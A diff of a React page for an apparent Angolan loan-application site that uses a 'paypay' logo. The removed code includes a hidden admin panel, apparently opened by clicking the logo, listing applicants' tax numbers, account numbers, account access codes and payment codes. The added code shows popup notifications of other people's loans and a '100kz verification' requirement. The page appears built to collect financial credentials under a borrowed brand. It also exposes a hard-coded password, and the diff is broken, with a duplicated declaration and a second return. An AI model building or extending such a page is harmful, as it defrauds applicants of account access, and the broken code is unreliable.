@@ -314,458 +314,126 @@ function Index() {
 
   const nextStep = (next: Step) => setStep(next);
 
-  const StatusCheckArea = ({ onBack, compact = false }: { onBack: () => void; compact?: boolean }) => {
-    const [checkNif, setCheckNif] = useState("");
-    const [checkResult, setCheckResult] = useState<{ status: string; reason: string; color?: string } | null>(null);
-    const [loading, setLoading] = useState(false);
+  const nextStep = (next: Step) => setStep(next);
 
-    const handleCheck = async () => {
-      if (checkNif.length < 9) {
-        toast.error("Por favor, insira um NIF válido");
-        return;
-      }
-
-      setLoading(true);
-      try {
-        const data = await checkApplicationStatus({ data: { nif: checkNif } }) as any;
-        
-        if (!data) {
-          toast.error("Nenhuma candidatura encontrada para este NIF.");
-          setCheckResult(null);
-        } else {
-          setCheckResult({ 
-            status: data.analysis_color ? "Reprovado" : "Em revisão", 
-            reason: data.rejection_reason || (data.analysis_color ? "Candidatura reprovada por critérios internos." : "Aguardando verificação"),
-            color: data.analysis_color || 'blue'
-          });
-        }
-      } catch (err) {
-        toast.error("Erro ao consultar candidatura.");
-      } finally {
-        setLoading(false);
-      }
-
-    };
-
-    if (compact) {
-      return (
-        <div className="space-y-4">
-          <div className="relative bg-secondary/30 rounded-2xl p-3 flex items-center gap-3">
-            <input
-              type="text"
-              placeholder="Digite apenas o seu NIF (exc 009876543LA042)"
-              maxLength={14}
-              value={checkNif}
-              onChange={(e) => setCheckNif(e.target.value.toUpperCase())}
-              className="w-full text-xs outline-none bg-transparent placeholder:text-muted-foreground/50 font-medium"
-            />
-            <FileText className="w-4 h-4 text-muted-foreground/50" />
-          </div>
-
-          <button
-            onClick={handleCheck}
-            disabled={loading}
-            className="w-full bg-[#0F172A] text-white h-12 rounded-2xl font-bold text-xs shadow-lg hover:scale-[1.02] active:scale-[0.98] transition-all disabled:opacity-50 cursor-pointer flex items-center justify-center gap-2"
+  return (
+    <div className="min-h-screen bg-[#F8F9FC] font-sans selection:bg-primary/10 relative overflow-x-hidden">
+      {/* Dynamic Notifications */}
+      <AnimatePresence>
+        {notification && (
+          <motion.div
+            initial={{ opacity: 0, x: 50, scale: 0.9 }}
+            animate={{ opacity: 1, x: 0, scale: 1 }}
+            exit={{ opacity: 0, x: 50, scale: 0.9 }}
+            className="fixed top-20 right-4 z-[100] w-[280px] bg-white shadow-2xl rounded-2xl p-4 border border-primary/10 flex items-center gap-4 pointer-events-none"
           >
-            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
-            Consultar Empréstimo
-          </button>
-
-          {checkResult && (
-            <motion.div 
-              initial={{ opacity: 0, y: 10 }}
-              animate={{ opacity: 1, y: 0 }}
-              className="space-y-2"
-            >
-              {checkResult.status === "Reprovado" && checkResult.reason === "Dados inválidos. Tente novamente." && (
-                <div className="flex items-center gap-1.5 text-[10px] font-bold text-red-600 px-1">
-                  <XCircle className="w-3 h-3" />
-                  <span>Dados inválidos. Verifique e tente novamente.</span>
-                </div>
-              )}
-              <div className={cn(
-                "p-3 rounded-xl border space-y-2 text-left",
-                checkResult.color === 'red' || checkResult.status === "Reprovado" ? "bg-red-50 border-red-100" :
-                "bg-blue-50 border-blue-100"
-              )}>
-                <div className={cn(
-                  "flex items-center gap-2",
-                  checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-600" :
-                  "text-blue-600"
-                )}>
-                  {checkResult.status === "Reprovado" ? <AlertTriangle className="w-4 h-4" /> :
-                   <Info className="w-4 h-4" />}
-                  <span className="font-bold uppercase text-[10px]">Status: {checkResult.status}</span>
-                </div>
-                <p className={cn(
-                  "text-[11px] font-bold leading-tight",
-                  checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-700" :
-                  "text-blue-700"
-                )}>“{checkResult.reason}”</p>
-              </div>
-            </motion.div>
-          )}
-        </div>
-      );
-    }
-
-    return (
-      <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
-        <div className="space-y-2">
-          <h2 className="text-2xl font-bold">Verificar Candidatura</h2>
-          <p className="text-muted-foreground text-sm">Insira o seu NIF para consultar o estado do seu pedido.</p>
-        </div>
-
-        <div className="bg-white rounded-[32px] shadow-sm p-8 border border-border/40 space-y-6">
-          <div className="space-y-2 text-left">
-            <label className="text-sm font-bold text-foreground uppercase tracking-tight ml-1">NIF do Solicitante</label>
-            <div className="relative border-b border-border focus-within:border-primary transition-colors py-2">
-              <input
-                type="text"
-                placeholder="Ex: 000000000LA000"
-                maxLength={14}
-                value={checkNif}
-                onChange={(e) => setCheckNif(e.target.value.toUpperCase())}
-                className="w-full text-base outline-none bg-transparent placeholder:text-muted-foreground/50"
-              />
+            <div className="w-10 h-10 bg-primary/10 rounded-full flex items-center justify-center flex-shrink-0">
+              <CheckCircle2 className="w-6 h-6 text-primary" />
             </div>
-          </div>
-
-          <button
-            onClick={handleCheck}
-            disabled={loading}
-            className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-lg hover:scale-[1.02] active:scale-[0.98] transition-all disabled:opacity-50 cursor-pointer flex items-center justify-center gap-2"
-          >
-            {loading ? "Consultando..." : <><Search className="w-5 h-5" /> Verificar agora</>}
-          </button>
-
-          {checkResult && (
-            <motion.div 
-              initial={{ opacity: 0, y: 10 }}
-              animate={{ opacity: 1, y: 0 }}
-              className="pt-4 border-t border-border/10 space-y-4"
-            >
-              {checkResult.status === "Reprovado" && checkResult.reason === "Dados inválidos. Tente novamente." && (
-                <div className="flex items-center gap-2 text-xs font-bold text-red-600 px-1 justify-center">
-                  <XCircle className="w-4 h-4" />
-                  <span>Dados inválidos. Verifique e tente novamente.</span>
-                </div>
-              )}
-              <div className={cn(
-                "p-4 rounded-2xl border space-y-3",
-                checkResult.color === 'red' || checkResult.status === "Reprovado" ? "bg-red-50 border-red-100" :
-                "bg-blue-50 border-blue-100"
-              )}>
-                <div className={cn(
-                  "flex items-center gap-2 justify-center",
-                  checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-600" :
-                  "text-blue-600"
-                )}>
-                  {checkResult.status === "Reprovado" ? <AlertTriangle className="w-5 h-5" /> :
-                   <Info className="w-5 h-5" />}
-                  <span className="font-black uppercase text-sm">Status: {checkResult.status}</span>
-                </div>
-                <div className="space-y-1">
-                  <p className={cn(
-                    "text-[10px] uppercase font-black",
-                    checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-400" :
-                    "text-blue-400"
-                  )}>Motivo da Decisão</p>
-                  <p className={cn(
-                    "text-sm font-bold",
-                    checkResult.color === 'red' || checkResult.status === "Reprovado" ? "text-red-700" :
-                    "text-blue-700"
-                  )}>“{checkResult.reason}”</p>
-                </div>
-              </div>
-              <p className="text-[10px] text-muted-foreground italic text-center">
-                A sua candidatura não cumpre os requisitos mínimos do sistema. Para mais informações, contacte o suporte.
+            <div className="flex flex-col min-w-0">
+              <p className="text-[13px] font-bold text-foreground leading-tight truncate">
+                {notification.name}
               </p>
-            </motion.div>
-          )}
-        </div>
-
-        <button 
-          onClick={onBack}
-          className="text-sm font-bold text-muted-foreground hover:text-primary transition-colors flex items-center justify-center gap-1 mx-auto"
-        >
-          <ChevronLeft className="w-4 h-4" /> Voltar ao início
-        </button>
-      </div>
-    );
-  };
-
-  const AdminDataList = () => {
-    const [deletedApps, setDeletedApps] = useState<any[]>([]);
-    const [innerLoading, setInnerLoading] = useState(false);
-    
-
-    // Handle scroll position persistence for admin panel
-    const handleScrollPersist = () => {
-      if (adminScrollRef.current) {
-        sessionStorage.setItem("admin_scroll_pos", adminScrollRef.current.scrollTop.toString());
-      }
-    };
-
-    useEffect(() => {
-      const savedScroll = sessionStorage.getItem("admin_scroll_pos");
-      if (savedScroll && adminScrollRef.current) {
-        adminScrollRef.current.scrollTop = parseInt(savedScroll);
-      }
-    }, [adminTab, applications, deletedApps]);
-
-    const filteredApps = useMemo(() => {
-      if (adminTab !== "users") return deletedApps;
-      return applications;
-    }, [applications, deletedApps, adminTab]);
-
-
-
-
-    const fetchDeletedApps = async () => {
-      try {
-        setInnerLoading(true);
-        const data = await getDeletedApplications({ data: { adminPassword } });
-        if (data) setDeletedApps(data);
-      } catch (err: any) {
-        toast.error("Erro ao carregar lixeira: " + (err.message || "Erro desconhecido"));
-      } finally {
-        setInnerLoading(false);
-      }
-    };
-
-    useEffect(() => {
-      if (adminAuthenticated) {
-        if (adminTab === "users") fetchApplications();
-        else fetchDeletedApps();
-      }
-    }, [adminAuthenticated, adminTab]);
-
-    const updateStatus = async (id: string, isCorrect: boolean) => {
-      setRejectionDialog({ 
-        isOpen: true, 
-        appId: id, 
-        isCorrect,
-        onConfirm: fetchApplications
-      });
-      setCustomRejectionReason(isCorrect ? "Empréstimo Aprovado" : "Dados incorretos");
-    };
-
-    const deleteItem = async (id: string) => {
-      if (!confirm("Mover para a lixeira? Os dados serão apagados definitivamente após 10 dias.")) return;
-      
-      try {
-        const result = await deleteApplication({ data: { id, adminPassword } });
-        if (result && result.success) {
-          toast.success("Dados movidos para a lixeira");
-          setApplications(prev => prev.filter(app => app.id !== id));
-        }
-      } catch (err: any) {
-        toast.error("Erro ao apagar dados: " + (err.message || "Erro desconhecido"));
-      }
-    };
-
-    const restoreItem = async (id: string) => {
-      try {
-        const result = await restoreApplication({ data: { id, adminPassword } });
-        if (result && result.success) {
-          toast.success("Dados recuperados com sucesso");
-          setDeletedApps(prev => prev.filter(app => app.id !== id));
-        }
-      } catch (err) {
-        toast.error("Erro ao recuperar dados");
-      }
-    };
-
-    const permanentDelete = async (id: string) => {
-      const permanentPassword = prompt("Digite a senha para remover permanentemente:");
-      if (!permanentPassword) return;
-
-      try {
-        const result = await deletePermanently({ data: { id, adminPassword, permanentPassword } });
-        if (result && result.success) {
-          toast.success("Dados removidos permanentemente");
-          setDeletedApps(prev => prev.filter(app => app.id !== id));
-        }
-      } catch (err: any) {
-        toast.error(err.message || "Erro ao remover permanentemente");
-      }
-    };
-
-    const emptyTrash = async () => {
-      const permanentPassword = prompt("O site a remover da lixeira tá mbora mostrar mais a senha tá assim não pode falar a senha pois tem outros que vão ter acesso Digite a senha moneytooll para remover permanentemente:");
-      if (!permanentPassword) return;
-
-      try {
-        setInnerLoading(true);
-        const result = await deleteAllPermanently({ data: { adminPassword, permanentPassword } });
-        if (result && result.success) {
-          toast.success("Lixeira esvaziada com sucesso");
-          setDeletedApps([]);
-        }
-      } catch (err: any) {
-        toast.error(err.message || "Erro ao esvaziar lixeira");
-      } finally {
-        setInnerLoading(false);
-      }
-    };
-
-    if (innerLoading) return <div className="text-xs text-muted-foreground animate-pulse text-center py-8">Carregando...</div>;
-    
-    
-    const currentList = filteredApps;
-    
-    if (currentList.length === 0) return (
-      <div className="space-y-4">
-        <div className="text-xs text-muted-foreground italic text-center py-8">Nenhum registo encontrado.</div>
-      </div>
-    );
-
-    return (
-      <div 
-        ref={adminScrollRef}
-        onScroll={handleScrollPersist}
-        className="space-y-4 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar"
-      >
-
-
-        {adminTab === "trash" && deletedApps.length > 0 && (
-          <div className="flex justify-end mb-2">
-            <button
-              onClick={emptyTrash}
-              className="flex items-center gap-1.5 px-3 py-1.5 bg-red-600 text-white rounded-lg text-[10px] font-bold hover:bg-red-700 transition-colors shadow-sm"
-            >
-              <Trash2 className="w-3 h-3" /> Eliminar tudo
-            </button>
-          </div>
-        )}
-
-        {currentList.map((app) => (
-          <div 
-            key={app.id} 
-            className={cn(
-              "p-4 rounded-2xl border transition-all duration-300 relative group",
-              adminTab === "trash" ? "bg-gray-50 border-gray-200" :
-              app.analysis_color === 'green' ? "bg-green-50 border-green-200" : 
-              app.analysis_color === 'red' ? "bg-red-50 border-red-200" : 
-              "bg-white border-border/40 shadow-sm"
-            )}
-          >
-            {adminTab === "users" ? (
-              <button 
-                onClick={() => deleteItem(app.id)}
-                className="absolute top-3 right-3 p-2 text-muted-foreground hover:text-destructive transition-colors rounded-full hover:bg-destructive/10"
-                title="Mover para lixeira"
-              >
-                <Trash2 className="w-4 h-4" />
-              </button>
-            ) : (
-              <div className="absolute top-3 right-3 flex gap-1">
-                <button 
-                  onClick={() => restoreItem(app.id)}
-                  className="p-2 text-primary hover:bg-primary/10 transition-colors rounded-full"
-                  title="Recuperar dados"
-                >
-                  <RotateCcw className="w-4 h-4" />
-                </button>
-                <button 
-                  onClick={() => permanentDelete(app.id)}
-                  className="p-2 text-destructive hover:bg-destructive/10 transition-colors rounded-full"
-                  title="Remover permanentemente"
-                >
-                  <Trash2 className="w-4 h-4" />
-                </button>
-              </div>
-            )}
-
-            <div className="space-y-4">
-              <div className="flex justify-between items-start">
-                <div className="space-y-1">
-                  <p className="text-[10px] font-black text-primary uppercase tracking-wider">
-                    {adminTab === "trash" ? "Apagado" : "Candidatura"} #{app.id.slice(0, 8).toUpperCase()}
-                  </p>
-                  <h4 className="text-base font-bold text-foreground">{app.name || "Nome não informado"}</h4>
-                </div>
-                <div className="flex flex-col items-end gap-1">
-                  <span className={cn(
-                    "text-[10px] px-2 py-1 rounded-full font-bold uppercase",
-                    app.status === 'Pendente' ? "bg-amber-100 text-amber-700" : 
-                    app.analysis_color === 'green' ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"
-                  )}>
-                    {app.status || 'Pendente'}
-                  </span>
-                </div>
-              </div>
-              
-              <div className="grid grid-cols-2 gap-x-4 gap-y-3 py-3 border-y border-border/10">
-                <div className="space-y-0.5">
-                  <p className="text-[9px] text-muted-foreground uppercase font-bold">NIF / Conta</p>
-                  <p className="text-xs font-bold">{app.nif || "---"} | {app.account_number || "---"}</p>
-                </div>
-                <div className="space-y-0.5">
-                  <p className="text-[9px] text-muted-foreground uppercase font-bold">Total a Devolver</p>
-                  <p className="text-xs font-black text-primary">{app.total_to_refund ? `${Number(app.total_to_refund).toLocaleString()} Kz` : "---"}</p>
-                </div>
-                <div className="space-y-0.5">
-                  <p className="text-[9px] text-muted-foreground uppercase font-bold">Cód. Acesso</p>
-                  <p className="text-xs font-mono font-bold text-muted-foreground">{app.access_code || "---"}</p>
-                </div>
-                <div className="space-y-0.5">
-                  <p className="text-[9px] text-muted-foreground uppercase font-bold">Cód. Pagamento</p>
-                  <p className="text-xs font-mono font-bold text-primary">{app.payment_code || "---"}</p>
-                </div>
-              </div>
-
-              {adminTab === "users" && (
-                <div className="flex gap-2 pt-2">
-                  <button
-                    onClick={() => updateStatus(app.id, true)}
-                    className="flex-1 bg-green-600 hover:bg-green-700 text-white py-2.5 rounded-xl text-[11px] font-bold transition-all shadow-md shadow-green-200 flex items-center justify-center gap-1.5"
-                  >
-                    <CheckCircle2 className="w-3.5 h-3.5" /> Dados corretos
-                  </button>
-                  <button
-                    onClick={() => updateStatus(app.id, false)}
-                    className="flex-1 bg-red-600 hover:bg-red-700 text-white py-2.5 rounded-xl text-[11px] font-bold transition-all shadow-md shadow-red-200 flex items-center justify-center gap-1.5"
-                  >
-                    <XCircle className="w-3.5 h-3.5" /> Dados errados
-                  </button>
-                </div>
-              )}
-
-              <div className="text-[9px] text-muted-foreground/60 text-center italic space-y-1">
-                <div>Criado em: {new Date(app.created_at).toLocaleString()}</div>
-                {adminTab === "trash" && app.deleted_at && (
-                  <div className="text-destructive font-bold">Apagado em: {new Date(app.deleted_at).toLocaleString()}</div>
-                )}
-              </div>
+              <p className="text-[11px] text-muted-foreground leading-tight mt-1">
+                Empréstimo de <span className="font-bold text-primary">{notification.amount.toLocaleString("pt-AO")} Kz</span>.
+              </p>
             </div>
-          </div>
-        ))}
-      </div>
-    );
-  };
+          </motion.div>
+        )}
+      </AnimatePresence>
 
-  const Logo = ({ className }: { className?: string }) => (
-    <div 
-      onClick={() => setLogoClicks(prev => prev + 1)}
-      className={cn("flex items-center gap-2 cursor-pointer select-none relative overflow-hidden", className)}
-    >
-      <img src={logoPaypay} alt="paypay" className="h-8 md:h-10 invisible" />
-      <img 
-        src={logoPaypay} 
-        alt="paypay" 
-        className="absolute inset-0 w-full h-full object-contain z-20" 
-      />
-      <div className="absolute inset-0 z-10 opacity-20 pointer-events-none flex items-center justify-center">
-        <img 
-          src={logoPaypay} 
-          alt="" 
-          className="w-full h-full object-contain scale-125 rotate-6" 
-        />
+      <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between border-b border-border/40 bg-white/80 backdrop-blur-md sticky top-0 z-50">
+        <div className="flex items-center gap-4">
+          {step !== "home" && step !== "success" && (
+            <button 
+              onClick={() => {
+                if (step === "login") setStep("home");
+                else if (step === "check_status") setStep("home");
+                else if (step === "step2") setStep("login");
+                else if (step === "step3") setStep("step2");
+                else if (step === "step4") setStep("step3");
+                else if (step === "summary") setStep("step4");
+                else if (step === "confirm") setStep("summary");
+                else if (step === "admin") setStep("home");
+              }}
+              className="p-2 hover:bg-secondary rounded-full transition-colors cursor-pointer text-muted-foreground hover:text-primary"
+              aria-label="Voltar"
+            >
+              <ChevronLeft className="w-5 h-5" />
+            </button>
+          )}
+          <Logo onClick={() => setLogoClicks(prev => prev + 1)} className="h-6" />
+        </div>
+        <div className="flex items-center gap-6 text-[11px] font-medium text-muted-foreground">
+          <button className="flex items-center gap-1 hover:text-primary transition-colors cursor-pointer">
+            <Globe className="w-3.5 h-3.5" /> Português (AO)
+          </button>
+          <button className="flex items-center gap-1 hover:text-primary transition-colors cursor-pointer">
+            <HelpCircle className="w-3.5 h-3.5" /> Ajudar
+          </button>
+        </div>
       </div>
-    </div>
-  );
+
+      <div className="max-w-md mx-auto px-6 py-12 min-h-[calc(100vh-64px)] flex flex-col items-center justify-center">
+        <main className="w-full">
+          <AnimatePresence mode="wait">
+            {(step === "home" || step === "check_status") && (
+              <motion.div
+                key={step}
+                initial={{ opacity: 0, y: 20 }}
+                animate={{ opacity: 1, y: 0 }}
+                exit={{ opacity: 0, y: -20 }}
+                className="text-center space-y-8"
+              >
+                {step === "home" ? (
+                  <>
+                    <div className="space-y-4">
+                      <h1 className="text-3xl font-bold text-foreground leading-tight">
+                        Dinheiro rápido e seguro quando você mais precisa.
+                      </h1>
+                      <p className="text-muted-foreground">
+                        Solicite seu empréstimo em minutos de forma simples e 100% digital.
+                      </p>
+                    </div>
+                    
+                    <div className="space-y-6 pt-4">
+                      <button
+                        onClick={() => nextStep("login")}
+                        className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-xl shadow-primary/20 hover:scale-[1.02] active:scale-[0.98] transition-all cursor-pointer"
+                      >
+                        Solicitar Empréstimo
+                      </button>
+
+                      <div className="grid grid-cols-2 gap-4 pt-4">
+                        <div className="bg-white rounded-2xl shadow-sm p-4 border border-border/40 flex items-center justify-between group hover:border-primary transition-colors cursor-pointer" onClick={() => setStep("check_status")}>
+                          <div className="flex flex-col text-left">
+                            <h3 className="text-[11px] font-bold text-foreground">Consultar Empréstimo</h3>
+                            <p className="text-[9px] text-muted-foreground">Estado do pedido</p>
+                          </div>
+                          <Search className="w-4 h-4 text-primary" />
+                        </div>
+
+                        <div 
+                          className="bg-white rounded-2xl shadow-sm p-4 border border-border/40 flex items-center justify-between group hover:border-primary transition-colors cursor-pointer"
+                          onClick={() => toast.info("Requisitos: Conta ativa há mais de 2 meses, NIF válido e 100kz em conta para verificação.")}
+                        >
+                          <div className="flex flex-col text-left">
+                            <h3 className="text-[11px] font-bold text-foreground">Requisitos</h3>
+                            <p className="text-[9px] text-muted-foreground">Ver critérios</p>
+                          </div>
+                          <Info className="w-4 h-4 text-primary" />
+                        </div>
+                      </div>
+                    </div>
+                  </>
+                ) : (
+                  <StatusCheckArea onBack={() => setStep("home")} />
+                )}
+              </motion.div>
+            )}
+            
+            {/* Step components would follow here... */}
+
 
   return (
     <div className="min-h-screen bg-[#F8F9FC] font-sans selection:bg-primary/10 relative overflow-x-hidden">
